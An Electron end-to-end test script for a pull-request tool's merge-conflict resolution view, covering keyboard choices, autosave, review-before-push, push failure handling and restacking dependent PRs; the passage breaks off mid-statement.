import { loadWorkbenchPage, waitForWorkbenchQueue } from './workbench-ready';
import { parsePatchFiles } from '@pierre/diffs';
import assert from 'node:assert/strict';
import { app, BrowserWindow } from 'electron';
app.disableHardwareAcceleration();
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
void app.whenReady().then(async () => {
  const win = new BrowserWindow({
    width: 1280,
    height: 900,
    show: true,
    webPreferences: { contextIsolation: true, sandbox: true, backgroundThrottling: false },
  });
  win.webContents.on('console-message', (event) => {
    if (event.message.includes('Error')) console.error(event.message);
  });
  // A failed script names itself, so a failure says which step it was.
  const js = <T = unknown>(code: string) =>
    (win.webContents.executeJavaScript(code) as Promise<T>).catch((error: unknown) => {
      throw new Error(`${error instanceof Error ? error.message : String(error)}\n${code.slice(0, 400)}`);
    });
  const wait = async (code: string) => {
    for (let n = 0; n < 400; n++) {
      if (await js(code)) return;
      await new Promise((r) => setTimeout(r, 30));
    }
    throw Error(
      `Timed out: ${code}\nFocus: ${await js<string>('document.activeElement?.outerHTML.slice(0,300)')}\n${await js<string>('document.body.innerText')}`
    );
  };
  // Button names without their keyboard hints.
  const visibleButton = (label: string) =>
    `[...document.querySelectorAll('button,a[data-slot=button]')].find(b=>{if(!b.checkVisibility())return false;const c=b.cloneNode(true);c.querySelectorAll('kbd').forEach(k=>k.remove());return c.textContent.trim()===${JSON.stringify(label)};})`;
  const click = async (label: string) => {
    await wait(`(${visibleButton(label)}) && !(${visibleButton(label)}).disabled`);
    await js(`(${visibleButton(label)}).click()`);
  };
  const exists = (label: string) => js<boolean>(`!!(${visibleButton(label)})`);
  const key = async (value: string) => {
    const named: Record<string, [string, number]> = { Enter: ['Enter', 13], Escape: ['Escape', 27] };
    const [code, vk] = named[value] ?? [
      /\d/.test(value) ? `Digit${value}` : `Key${value.toUpperCase()}`,
      value.toUpperCase().charCodeAt(0),
    ];
    await win.webContents.debugger.sendCommand('Input.dispatchKeyEvent', {
      type: 'keyDown',
      key: value,
      code,
      windowsVirtualKeyCode: vk,
      ...(value === 'Enter' ? { text: '\r' } : value.length === 1 ? { text: value } : {}),
    });
    await win.webContents.debugger.sendCommand('Input.dispatchKeyEvent', {
      type: 'keyUp',
      key: value,
      code,
      windowsVirtualKeyCode: vk,
    });
    await new Promise((r) => setTimeout(r, 150));
  };
  const publishes = () => js<number>("window.conflictCalls.filter(r=>r.kind==='publish').length");
  const calls = (kind: string) => js<number>(`window.conflictCalls.filter(r=>r.kind===${JSON.stringify(kind)}).length`);
  const dir = path.resolve('.impeccable/review/conflict-resolution');
  const capture = async (name: string) => {
    await js('document.fonts.ready');
    await new Promise((r) => setTimeout(r, 300));
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, `${name}.png`), (await win.webContents.capturePage()).toPNG());
  };
  const resize = async (width: number, height: number) => {
    win.setSize(width, height);
    await new Promise((r) => setTimeout(r, 300));
  };
  /** Light, dark and narrow captures of one state. The window returns to its size and theme. */
  const captureAll = async (name: string) => {
    const [width, height] = win.getSize();
    const dark = await js<boolean>("document.documentElement.classList.contains('dark')");
    const focused = await js<boolean>('(window.__focus=document.activeElement, true)');
    await js("document.documentElement.classList.remove('dark')");
    await capture(`${name}-light`);
    await js("document.documentElement.classList.add('dark')");
    await capture(`${name}-dark`);
    await resize(760, 800);
    await capture(`${name}-narrow-dark`);
    await js("document.documentElement.classList.remove('dark')");
    await capture(`${name}-narrow-light`);
    if (dark) await js("document.documentElement.classList.add('dark')");
    await resize(width, height);
    if (focused) await js('window.__focus?.focus?.({preventScroll:true})');
  };
  /** Every visible footer button sits inside the footer, the footer inside the dialog, and code above it. */
  const footerFits = () =>
    js<boolean>(`(()=>{
      const footer=document.querySelector('.conflict-footer');if(!footer)return false;
      const f=footer.getBoundingClientRect();const d=document.querySelector('.conflict-workspace').getBoundingClientRect();
      const scroll=document.querySelector('.conflict-scroll')?.getBoundingClientRect();
      const buttons=[...footer.querySelectorAll('button')].filter(b=>b.checkVisibility());
      return buttons.length>0&&f.bottom<=d.bottom+0.5&&f.top>=d.top&&(!scroll||scroll.bottom<=f.top+0.5)&&
        buttons.every(b=>{const r=b.getBoundingClientRect();return r.top>=f.top-0.5&&r.bottom<=f.bottom+0.5&&r.left>=d.left-0.5&&r.right<=d.right+0.5;});
    })()`);
  const stage = () => js<string>("document.querySelector('.conflict-file-title [data-stage]')?.dataset.stage");
  const primary = () => js<string>("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary");
  /** Every proposal's checks have finished: no block or summary still says it is checking. */
  const checksDone = () =>
    wait(
      "!!document.querySelector('.conflict-workspace') && !/Checking the result|Checking \\d+ results?…/.test(document.querySelector('.conflict-workspace')?.textContent ?? '')"
    );
  const block = (index: number) => `document.querySelector('.conflict-block[data-conflict-index="${index}"]')`;
  const activeBlock = () =>
    js<string | null>("document.activeElement?.closest('.conflict-block')?.dataset.conflictIndex ?? null");
  const open = () =>
    js("window.dispatchEvent(new CustomEvent('gnosis-resolve-conflicts',{detail:window.conflictFixture.url}))");
  try {
    await loadWorkbenchPage(win, `${process.env.GNOSIS_WORKBENCH_URL}?pr-summary&checks`);
    win.webContents.debugger.attach('1.3');
    await win.webContents.debugger.sendCommand('Emulation.setFocusEmulationEnabled', { enabled: true });
    await waitForWorkbenchQueue(win.webContents);
    const patch =
      'diff --git a/src/retry.ts b/src/retry.ts\n--- a/src/retry.ts\n+++ b/src/retry.ts\n@@ -1 +1 @@\n-export const delay = 5000;\n+export const delay = 3000;\n' +
      'diff --git a/src/clock.ts b/src/clock.ts\n--- a/src/clock.ts\n+++ b/src/clock.ts\n@@ -1 +1 @@\n-export const tick = 10;\n+export const tick = 20;\n';
    await js(`window.conflictPreview=${JSON.stringify(parsePatchFiles(patch).flatMap((p) => p.files))}`);
    await js(`(()=>{
      const original='export function retryDelay(attempt: number) {\\n<<<<<<< feature/retry\\n  return Math.min(attempt * 200, 5000);\\n||||||| ancestor\\n  return attempt * 200;\\n=======\\n  return Math.max(100, attempt * 200);\\n>>>>>>> main\\n}\\n<<<<<<< feature/retry\\nexport const retries = 5;\\n=======\\nexport const retries = 3;\\n>>>>>>> main\\n';
      window.conflictFixture={id:'a'.repeat(64),account:'oddur',url:'https://github.com/klang/engine/pull/120',title:'Bound retry delays',headRepo:'klang/engine',baseRepo:'klang/engine',headBranch:'feature/retry',baseBranch:'main',headSha:'a'.repeat(40),baseSha:'b'.repeat(40),tree:'c'.repeat(40),version:1,status:'editing',files:[{path:'src/retry.ts',mode:'100644',base:'export function retryDelay(attempt: number) {\\n  return attempt * 200;\\n}\\nexport const retries = 4;\\n',ours:'export function retryDelay(attempt: number) {\\n  return Math.min(attempt * 200, 5000);\\n}\\nexport const retries = 5;\\n',theirs:'export function retryDelay(attempt: number) {\\n  return Math.max(100, attempt * 200);\\n}\\nexport const retries = 3;\\n',original,result:original,resolved:false,source:'manual'}]};
      window.conflictCalls=[];
      window.electronAPI.conflictResolution=async req=>{
        window.conflictCalls.push(req);const s=window.conflictFixture;
        if(req.kind==='open'){if(window.failOpen)throw Error(window.failOpen);if(window.slowOpen)await new Promise(r=>setTimeout(r,window.slowOpen));return {session:structuredClone(s)};}
        if(req.version!==s.version)throw Error('The saved resolution changed. Reopen the workspace before continuing.');
        if(req.kind==='save'){const f=s.files.find(f=>f.path===req.path);if(f.result!==req.contents){f.source='manual';f.explanation=undefined;}f.result=req.contents;f.resolved=req.resolved;if(req.picks)f.picks=req.picks.some(Boolean)?req.picks:undefined;}
        if(req.kind==='resolve'&&req.engine==='whole-file'){const f=s.files.find(f=>f.path===req.path);if(!f?.wholeFile)throw Error('This file has no whole-file proposal.');f.result=f.wholeFile.text;f.explanation='Mergiraf proposed a result. Review it before marking the file reviewed.';f.resolved=false;f.source=f.wholeFile.source==='mergiraf'?'mergiraf':'manual';}
        else if(req.kind==='resolve'){s.files[0].result='export function retryDelay(attempt: number) {\\n  return Math.min(5000, Math.max(100, attempt * 200));\\n}\\nexport const retries = 5;\\n';s.files[0].explanation='Preserved the minimum delay from main and the cap from this PR. Tests have not been run.';s.files[0].resolved=false;s.files[0].source=req.engine;}
        if(req.kind==='preview')return {session:structuredClone(s),preview:{token:'reviewed',patch:'',validation:'',files:window.conflictPreview}};
        if(req.kind==='publish'){if(window.failPublish)throw Error("Error invoking remote method 'conflict-resolution': Error: Git could not complete this operation. To github.com:klang/engine.git\\n ! [rejected]        feature/retry (stale info)\\nerror: failed to push some refs");s.status='published';s.commitSha='d'.repeat(40);}
        s.version++;return {session:structuredClone(s)};
      };
    })()`);
    await js(`(async()=>{
      const stack=(await window.electronAPI.workbenchQueue()).items.find(i=>i.subject.kind==='stack');
      const read=window.electronAPI.getQueueSignals;
      window.electronAPI.getQueueSignals=async requests=>(await read(requests)).map(value=>value.url.endsWith('/120')?{...value,readiness:{...value.readiness,mergeable:'CONFLICTING',mergeState:'DIRTY'}}:value);
      const {publishQueueSignals}=await import('/lib/use-queue-signals.ts');
      publishQueueSignals('oddur',await window.electronAPI.getQueueSignals(stack.subject.members.map(({url,headSha})=>({url,headSha}))));
    })()`);
    // The row menu offers Resolve conflicts only for conflicts, or while GitHub has not answered.
    const rowMenuOffers = async (mergeable: string, mergeState: string, checkedAt: number) => {
      await js(`(async()=>{
        const pr=(await window.electronAPI.workbenchQueue()).items.flatMap(i=>i.subject.members).find(m=>m.number===152);
        const [value]=await window.electronAPI.getQueueSignals([{url:pr.url,headSha:pr.headSha}]);
        const {publishQueueSignals}=await import('/lib/use-queue-signals.ts');
        publishQueueSignals('oddur',[{...value,checkedAt:${checkedAt},readiness:{...value.readiness,mergeable:${JSON.stringify(mergeable)},mergeState:${JSON.stringify(mergeState)}}}]);
      })()`);
      await js(
        `(()=>{const b=[...document.querySelectorAll('button')].find(b=>b.getBoundingClientRect().width&&b.getAttribute('aria-label')==='Actions for PR #152');b.focus();b.dispatchEvent(new KeyboardEvent('keydown',{key:'ArrowDown',bubbles:true}))})()`
      );
      await wait("[...document.querySelectorAll('[role=menuitem]')].some(e=>e.textContent==='Copy PR link')");
      const offered = await js<boolean>("[...document.querySelectorAll('[role=menuitem]')].some(e=>e.textContent==='Resolve conflicts…')");
      win.webContents.sendInputEvent({ type: 'keyDown', keyCode: 'Escape' });
      await wait("!document.querySelector('[role=menu]')");
      return offered;
    };
    const later = Date.now() + 3_600_000;
    assert.equal(await rowMenuOffers('MERGEABLE', 'CLEAN', later), false, 'A PR ready to merge has nothing to resolve');
    assert.equal(await rowMenuOffers('MERGEABLE', 'BEHIND', later + 1), false, 'A PR only behind main updates instead');
    assert.equal(await rowMenuOffers('UNKNOWN', 'UNKNOWN', later + 2), true, 'GitHub is still computing');
    assert.equal(await rowMenuOffers('CONFLICTING', 'DIRTY', later + 3), true);
    await js(
      "document.querySelector('.queue-disclosure').closest('.queue-item').querySelector('.queue-row-main').dispatchEvent(new MouseEvent('dblclick',{bubbles:true}))"
    );
    await click('Resolve conflicts…');
    await wait("document.querySelector('.conflict-block[data-state=open]')");
    assert.equal(await js('window.conflictCalls[0].url'), 'https://github.com/klang/engine/pull/120');

    // P0: the conflict view speaks Gnosis. Versions are labelled; Git's markers and words never show.
    await wait("document.activeElement?.closest('.conflict-block')");
    assert.equal(await activeBlock(), '0', 'Opening focuses the first unresolved conflict, not Close');
    assert.deepEqual(await js(`[...${block(0)}.querySelectorAll('.conflict-side-label')].map(e=>e.textContent)`), [
      'This PR · feature/retry',
      'main',
    ]);
    assert.equal(
      await js(`${block(0)}.querySelector('.conflict-ancestor summary').textContent`),
      'Before both changes'
    );
    assert.equal(
      await js(`${block(0)}.querySelector('.conflict-ancestor').open`),
      false,
      'The ancestor starts collapsed'
    );
    assert.equal(
      await js(`!!${block(1)}.querySelector('.conflict-ancestor')`),
      false,
      'A two-way conflict has no ancestor'
    );
    assert.doesNotMatch(
      await js<string>("document.querySelector('.conflict-view').innerText"),
      /<{7}|>{7}|={7}|\|{7}|Current Change|Incoming Change/
    );
    assert.deepEqual(
      await js(`[...${block(0)}.querySelectorAll('.conflict-block-actions button')].map(b=>b.firstChild.textContent)`),
      ['Keep PR change', 'Keep main’s change', 'Keep both']
    );
    assert.equal(await exists('Save draft'), false, 'Drafts save automatically');
    // No step rail, no guide and no engine menu: the summary and the footer say where you are, and the keys are one
    // tooltip away.
    assert.equal(await js("!!document.querySelector('.conflict-workspace .step-list, #conflict-help')"), false);
    assert.equal(await exists('Guide'), false);
    assert.equal(await exists('Suggest a resolution'), false);
    assert.ok(await js("!!document.querySelector('[data-conflict-keys][aria-label=\"Keyboard shortcuts\"]')"));
    assert.equal(await js("document.querySelector('.conflict-save-state').textContent"), 'Saved');

    // A physical pointer click must dismiss the notification, not the conflict workspace.
    await js(
      `(async()=>{const {toast}=await import('/components/ui/toast.tsx');toast.add({title:'Conflict notification regression',description:'A background result is ready.',timeout:0});})()`
    );
    await wait('document.querySelector(\'.app-toast [aria-label="Dismiss notification"]\')');
    // The Conflicts view is a PR tab (#445 item 8), not a modal: notifications use the app's own viewport.
    assert.equal(await js("document.querySelector('.conflict-workspace').contains(document.querySelector('.app-toast'))"), false);
    assert.equal(await js("document.querySelector('.app-toast').getAttribute('role')"), 'group');
    // Notifications sit above the view's footer, never over its controls.
    const toastClearsFooter =
      "document.querySelector('.app-toasts').getBoundingClientRect().bottom <= document.querySelector('.conflict-footer').getBoundingClientRect().top + 0.5";
    await wait(toastClearsFooter);
    await capture('notification');
    await js(
      "(document.querySelector('.activity-trigger')?.click() ?? window.dispatchEvent(new KeyboardEvent('keydown',{key:'a',shiftKey:true,metaKey:window.electronAPI.platform==='darwin',ctrlKey:window.electronAPI.platform!=='darwin'})))"
    );
    await wait("document.querySelector('.activity-drawer')");
    await capture('notification-activity');
    await js('document.querySelector(\'[aria-label="Close activity"]\').click()');

    await resize(760, 800);
    await wait(toastClearsFooter);
    await capture('notification-narrow');
    assert.ok(await footerFits(), 'The footer stays visible with a notification');
    await resize(1280, 900);
    await js('document.querySelector(\'.app-toast [aria-label="Dismiss notification"]\').focus()');
    assert.ok(
      await js("document.activeElement?.getAttribute('aria-label')==='Dismiss notification'"),
      'The view permits keyboard focus on notifications'
    );
    const toastPoint = await js<{ x: number; y: number }>(
      `(()=>{const r=document.querySelector('.app-toast [aria-label="Dismiss notification"]').getBoundingClientRect();return {x:r.x+r.width/2,y:r.y+r.height/2}})()`
    );
    for (const type of ['mousePressed', 'mouseReleased'])
      await win.webContents.debugger.sendCommand('Input.dispatchMouseEvent', {
        type,
        ...toastPoint,
        button: 'left',
        clickCount: 1,
      });
    await new Promise((r) => setTimeout(r, 350));
    assert.ok(
      await js("!!document.querySelector('.conflict-workspace')"),
      'Dismissing a notification must not close Resolve conflicts'
    );
    await wait("!document.querySelector('.app-toast')");
    // Moving back to the global viewport keeps pending notifications and their actions.
    await js(
      `(async()=>{const {toast}=await import('/components/ui/toast.tsx');toast.add({title:'Background result',timeout:0});})()`
    );
    await click('Close');
    await wait("!document.querySelector('.conflict-workspace') && document.querySelector('.app-toast')");
    assert.equal(await js("!!document.querySelector('.app-toast-host .app-toast')"), false);
    await js('document.querySelector(\'.app-toast [aria-label="Dismiss notification"]\').click()');
    await wait("!document.querySelector('.app-toast')");

    // The Conflicts tab never carries to another PR: moving to the next PR opens it on Summary, and prepares nothing.
    await open();
    await wait("document.querySelector('.conflict-workspace') && document.querySelector('.pr-overview-tabs [role=tab][data-state=active]')?.textContent==='Conflicts'");
    const opens = await calls('open');
    const step = await js<string>("document.querySelector('[aria-label=\"Next change\"]:not(:disabled)') ? 'Next change' : 'Previous change'");
    await js(`document.querySelector('[aria-label="${step}"]').click()`);
    await wait(
      "!document.querySelector('.conflict-workspace') && document.querySelector('.pr-overview-tabs [role=tab][data-state=active]')?.textContent==='Summary'"
    );
    assert.equal(await calls('open'), opens, 'No conflict session is prepared for the other PR');
    assert.equal(await js("[...document.querySelectorAll('.pr-overview-tabs [role=tab]')].some(t=>t.textContent==='Conflicts')"), false);

    // Opening focuses the first conflict that needs you.
    await open();
    await wait("document.activeElement?.closest('.conflict-block')");
    await captureAll('conflicts');
    // The keys are listed on hover or focus of the keyboard button, as in the shortcut overlay.
    await js("document.querySelector('[data-conflict-keys]').focus()");
    await wait("document.querySelector('.conflict-keys')?.textContent.includes('Next / previous conflict')");
    await capture('keyboard-help');
    await js(`${block(0)}.focus()`);
    await wait("!document.querySelector('.conflict-keys')");
    assert.equal(await js("!!document.querySelector('.conflict-workspace .step-card-count')"), false);
    assert.equal(
      await js("document.querySelector('.conflict-workspace').textContent.includes('Nothing pushed')"),
      false
    );

    // Keyboard: J/K move between conflicts, 1/2/3 keep a side, and each choice leaves a note with Undo.
    await js(`${block(0)}.focus()`);
    await key('j');
    assert.equal(await activeBlock(), '1');
    await key('k');
    assert.equal(await activeBlock(), '0');
    await key('1');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /Kept PR change·Undo/);
    assert.equal(await activeBlock(), '1', 'A choice moves focus to the next open conflict');
    await key('2');
    await wait(`${block(1)}?.dataset.state==='kept'`);
    assert.equal(await stage(), 'resolved');
    assert.equal(
      await js("document.querySelector('.conflict-file-title [data-stage]').textContent"),
      'Resolved · needs review'
    );
    await wait("document.activeElement?.dataset.conflictPrimary==='review-result'");
    // Undo one block; the other keeps its choice.
    await js(`[...${block(0)}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Undo').click()`);
    await wait(`${block(0)}?.dataset.state==='open'`);
    assert.equal(await js(`${block(1)}.dataset.state`), 'kept');
    assert.equal(await stage(), 'conflicted');
    assert.equal(await activeBlock(), '0', 'Undo returns focus to the reopened conflict');
    await key('3');
    await wait(`${block(0)}?.dataset.state==='kept'`);
    assert.match(await js<string>(`${block(0)}.querySelector('.conflict-kept').textContent`), /Kept both changes/);
    // Autosave stores the draft without marking the file reviewed.
    await wait(
      "window.conflictFixture.files[0].result.includes('Math.max') && window.conflictFixture.files[0].result.includes('retries = 3')"
    );
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false);
    assert.equal(
      await js("document.querySelector('.conflict-workspace').textContent.includes('Unsaved changes')"),
      false
    );
    await captureAll('file-resolved');

    // Review before mark: Mark reviewed appears only after the result is shown next to the PR.
    assert.equal(await primary(), 'review-result');
    assert.equal(await exists('Mark reviewed'), false);
    await key('m');
    await wait("document.querySelector('.conflict-result-diff')");
    assert.equal(await js('window.conflictFixture.files[0].resolved'), false, 'M first shows the result');
    assert.deepEqual(
      await js(
        "[...document.querySelectorAll('.conflict-result-diff .conflict-diff-columns > span')].map(s=>s.lastChild.textContent)"
      ),
      ['This PR · feature/retry', 'Result after the merge']
    );
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
    await captureAll('review-result');

    // Structural merge already ran on every file: what is left is asking the model about this file, with the Bot icon.
    const ask = "document.querySelector('.conflict-suggest-trigger')";
    assert.match(await js<string>(`${ask}.textContent`), /^Ask .+…$/);
    assert.match(await js<string>(`${ask}.querySelector('svg').getAttribute('class')`), /lucide-bot/);
    await js(`${ask}.click()`);
    await wait("document.querySelector('.conflict-suggest-form textarea')");
    assert.equal(await js("!!document.querySelector('.conflict-suggest-item')"), false, 'No engine menu');
    assert.equal(await exists('Structural merge'), false);
    await js(
      `(()=>{const input=document.querySelector('.conflict-suggest-form textarea');Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set.call(input,'Keep the minimum delay.');input.dispatchEvent(new Event('input',{bubbles:true}));})()`
    );
    await capture('suggest-ask');
    await js("[...document.querySelectorAll('.conflict-suggest-form button')].at(-1).click()");
    await wait("document.querySelector('.conflict-proposal')?.textContent.includes('Preserved the minimum')");
    assert.equal(await js("window.conflictCalls.find(r=>r.kind==='resolve').instructions"), 'Keep the minimum delay.');
    assert.equal(await js("window.conflictCalls.find(r=>r.kind==='resolve').path"), 'src/retry.ts');
    assert.equal(
      await js('window.conflictFixture.files[0].resolved'),
      false,
      'Agent cannot mark its own proposal reviewed'
    );
    assert.match(
      await js<string>("document.querySelector('.conflict-footer-status').textContent"),
      /suggested a result/
    );
    assert.equal(
      await js(
        "[...document.querySelectorAll('.conflict-modes button')].find(b=>b.textContent==='Review result').getAttribute('aria-pressed')"
      ),
      'true'
    );
    await capture('proposal');

    // Manual edits save automatically and need a new review.
    await click('Edit result');
    await wait(
      "document.querySelector('.conflict-scroll diffs-container')?.shadowRoot?.querySelector('[contenteditable=true]')"
    );
    await js(
      "document.querySelector('.conflict-scroll diffs-container').shadowRoot.querySelector('[contenteditable=true]').focus()"
    );
    const point = await js<{ x: number; y: number }>(
      `(()=>{const r=document.querySelector('.conflict-scroll diffs-container').shadowRoot.querySelector('[contenteditable=true]').getBoundingClientRect();return {x:r.x+50,y:r.y+10}})()`
    );
    for (const type of ['mousePressed', 'mouseReleased'])
      await win.webContents.debugger.sendCommand('Input.dispatchMouseEvent', {
        type,
        ...point,
        button: 'left',
        clickCount: 1,
      });
    await js('new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)))');
    for (const type of ['keyDown', 'keyUp'])
      await win.webContents.debugger.sendCommand('Input.dispatchKeyEvent', {
        type,
        key: 'Home',
        code: 'Home',
        windowsVirtualKeyCode: 36,
      });
    // Let the native caret change reach Pierre's selection listener before typing.
    await js('new Promise(r => requestAnimationFrame(() => requestAnimationFrame(r)))');
    await win.webContents.debugger.sendCommand('Input.insertText', { text: '// Manual review note\n' });
    await wait('/Manual review note/.test(window.conflictFixture.files[0].result)');
    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
    assert.equal(await stage(), 'resolved');
    assert.equal(await primary(), 'review-result', 'A changed result needs to be shown again');
    await captureAll('editor');
    await click('Review result');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");

    // Marking the last file reviewed goes straight to the confirmation, which shows the final update.
    await click('Mark reviewed');
    await wait("document.querySelector('.conflict-confirm .step-card')");
    assert.equal(await js('window.conflictFixture.files[0].resolved'), true);
    assert.equal(await publishes(), 0, 'Reviewing and previewing never publish');
    assert.equal(await js("!!document.querySelector('.conflict-workspace .step-list')"), false, 'No step rail');
    assert.equal(
      await js("!!document.querySelector('.conflict-confirm .step-list,.conflict-confirm .step-card-count')"),
      false
    );
    const confirmText = await js<string>("document.querySelector('.conflict-confirm').innerText");
    assert.match(confirmText, /Pushes to (@\S+’s|your|the author’s) branch/);
    assert.match(confirmText, /Approvals may be dismissed if the repository requires it\./);
    assert.match(confirmText, /Your resolutions · 1 file/);
    assert.match(confirmText, /Changes coming from main · 1 file/);
    assert.equal((confirmText.match(/Nothing is pushed/g) ?? []).length, 1, 'Say “nothing pushed” once');
    await wait("document.activeElement?.classList.contains('step-card-body')");
    await captureAll('confirm-push');
    await js("document.querySelector('.conflict-confirm .step-card-body').focus()");
    await key('Enter');
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await publishes(), 0, 'Enter alone never pushes');

    // A push rejected because the branch moved: plain copy, nothing resent, Load latest changes.
    await js('window.failPublish=true');
    await click('Push merge commit');
    await wait("document.querySelector('.conflict-confirm .conflict-error')");
    assert.equal(
      await js("document.querySelector('.conflict-error-title').textContent"),
      'Someone pushed to feature/retry after you started.'
    );
    assert.match(
      await js<string>("document.querySelector('.conflict-error').textContent"),
      /Nothing was pushed\. Your resolutions are saved\./
    );
    assert.equal(await js("document.querySelector('.conflict-error-details').open"), false);
    assert.match(await js<string>("document.querySelector('.conflict-error-details pre').textContent"), /stale info/);
    assert.doesNotMatch(
      await js<string>("[...document.querySelectorAll('.conflict-error > div > p')].map(p=>p.textContent).join(' ')"),
      /rejected|Git could not|stale info/
    );
    await new Promise((r) => setTimeout(r, 400));
    assert.equal(await publishes(), 1, 'A failed push is never replayed');
    assert.ok(await js(`(${visibleButton('Push merge commit')}).disabled`));
    await captureAll('push-failed');
    await js('window.failPublish=false');
    await click('Load latest changes');
    await wait("window.conflictCalls.at(-1).kind==='open' && window.conflictCalls.at(-1).restart===true");
    await wait("document.querySelector('.conflict-files') && !document.querySelector('.conflict-confirm')");
    assert.equal(await publishes(), 1, 'Loading the latest changes only reads');
    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='confirm'");
    await click('Review and push…');
    await click('Back to files');
    await wait("document.querySelector('.conflict-files')");
    await click('Review and push…');
    await click('Push merge commit');

    // Outcome: the branch is updated, with the commit, what changed, checks, Done and an undo hint.
    await wait("document.querySelector('.conflict-outcome h2')?.textContent==='feature/retry updated'");
    assert.equal(await publishes(), 2);
    const outcome = await js<string>("document.querySelector('.conflict-outcome').innerText");
    assert.match(outcome, /Merge commit\s+ddddddd/);
    assert.match(outcome, /1 file resolved by you/);
    assert.match(outcome, /main’s changes included/);
    assert.match(outcome, /Checks restarting/);
    assert.match(outcome, /To undo, reset feature\/retry to\s+aaaaaaa/);
    await wait("document.activeElement?.textContent.trim()==='Done'");
    assert.ok(await exists('Open PR on GitHub'));
    await captureAll('published');

    // Reopened later, when the PR merges cleanly: nothing to resolve, and the last update only as history.
    await click('Done');
    await wait("!document.querySelector('.conflict-workspace')");
    await js("Object.assign(window.conflictFixture,{reopened:true,lastPush:{commitSha:'d'.repeat(40),headSha:'a'.repeat(40)}})");
    await open();
    await wait("document.querySelector('[data-conflict-reopened] h2')?.textContent==='Nothing to resolve'");
    const reopened = await js<string>("document.querySelector('[data-conflict-reopened]').innerText");
    assert.match(reopened, /This PR merges cleanly with main\./);
    assert.match(reopened, /Last update: merge commit\s+ddddddd\s+To undo it, reset feature\/retry to\s+aaaaaaa/);
    assert.doesNotMatch(reopened, /updated|Checks restarting|resolved by you/, 'The old result is not shown as news');
    assert.equal(await js("!!document.querySelector('.conflict-outcome, .step-list')"), false);
    await wait("document.activeElement?.textContent.trim()==='Done'");
    await captureAll('reopened-clean');
    await click('Done');
    await wait("!document.querySelector('.conflict-workspace')");
    await js('delete window.conflictFixture.reopened; delete window.conflictFixture.lastPush');
    await open();
    await wait("document.querySelector('.conflict-outcome h2')?.textContent==='feature/retry updated'");

    // Restacking is a separate, explicit preview-and-push flow after the root resolution.
    await js(`(()=>{
      window.conflictFixture.dependents=['https://github.com/klang/engine/pull/121','https://github.com/klang/engine/pull/122'];
      const original=window.electronAPI.conflictResolution;
      window.electronAPI.conflictResolution=async req=>{
        const s=window.conflictFixture;
        if(req.kind==='restack-prepare'){
          window.conflictCalls.push(req);s.restack={token:'e'.repeat(64),status:'prepared',rootSha:s.commitSha,expected:[{url:s.dependents[0],headSha:'a'.repeat(40),baseSha:'b'.repeat(40),headBranch:'feature/retry-121',baseBranch:'feature/retry'}],branches:[121,122].map((n,i)=>({url:'https://github.com/klang/engine/pull/'+n,title:i?'Make retry metrics observable':'Apply bounded retry delays',repo:'klang/engine',branch:'feature/retry-'+n,baseBranch:i?'feature/retry-121':'feature/retry',baseRepo:'klang/engine',baseSha:'b'.repeat(40),oldSha:'a'.repeat(40),newSha:'f'.repeat(40),commits:2,reused:i?0:1,patch:'',files:window.conflictPreview}))};s.version++;return {session:structuredClone(s)};
        }
        if(req.kind==='restack-save'){window.conflictCalls.push(req);const f=s.restack.blocked.files.find(f=>f.path===req.path);f.result=req.contents;f.resolved=req.resolved;s.version++;return {session:structuredClone(s)};}
        if(req.kind==='restack-continue'){window.conflictCalls.push(req);s.restack.status='prepared';s.restack.blocked=undefined;s.version++;return {session:structuredClone(s)};}
        if(req.kind==='restack-publish'){window.conflictCalls.push(req);s.restack.status='published';s.version++;return {session:structuredClone(s)};}
        return original(req);
      };
    })()`);
    await click('Done');
    await wait("!document.querySelector('.conflict-workspace')");
    await open();
    await wait("document.querySelector('.restack-review [aria-current=step]')?.dataset.step==='rebase'");
    assert.deepEqual(
      await js("[...document.querySelectorAll('.restack-review .step-list li')].map(li=>li.dataset.step)"),
      ['rebase', 'review', 'push']
    );
    assert.ok(await exists('Skip'), 'Restacking is optional before it starts');
    await captureAll('restack-plan');
    await click('Prepare restack · 2 PRs');
    await wait("document.querySelectorAll('.restack-reviewed input').length===2");
    assert.equal(
      await js("document.querySelectorAll('.restack-branch-header .restack-reviewed input').length"),
      2,
      'Each update’s review control sits at its header'
    );
    assert.equal(await js("document.querySelector('.restack-review [aria-current=step]').dataset.step"), 'review');
    assert.equal(await exists('Skip'), false);
    assert.equal(await calls('restack-publish'), 0);
    assert.ok(
      await js("[...document.querySelectorAll('.restack-review [data-step-continue]')].every(b=>b.disabled)"),
      'Continue waits for every PR update to be reviewed'
    );
    assert.match(
      await js<string>("document.querySelector('.restack-review .step-card-status').textContent"),
      /Mark each update reviewed to continue/
    );
    await captureAll('restack-review');
    await js("document.querySelectorAll('.restack-reviewed input').forEach(input=>input.click())");
    await click('Continue');
    await wait("document.querySelector('.restack-review [aria-current=step]')?.dataset.step==='push'");
    assert.equal(await js("document.querySelectorAll('.restack-confirm li').length"), 2);
    await key('Enter');
    await new Promise((r) => setTimeout(r, 300));
    assert.equal(await calls('restack-publish'), 0, 'Enter alone never pushes');
    await captureAll('restack-confirm');
    await click('Push 2 PR updates');
    await wait("document.querySelector('.restack-review h2').textContent==='Dependent PRs updated'");
    assert.deepEqual(await js("window.conflictCalls.find(r=>r.kind==='restack-publish').reviewed"), [
      'https://github.com/klang/engine/pull/121',
      'https://github.com/klang/engine/pull/122',
    ]);
    await captureAll('restack-published');
    await click('Close');
    // A paused restack uses the same conflict view as the main resolution.
    await js(`(()=>{
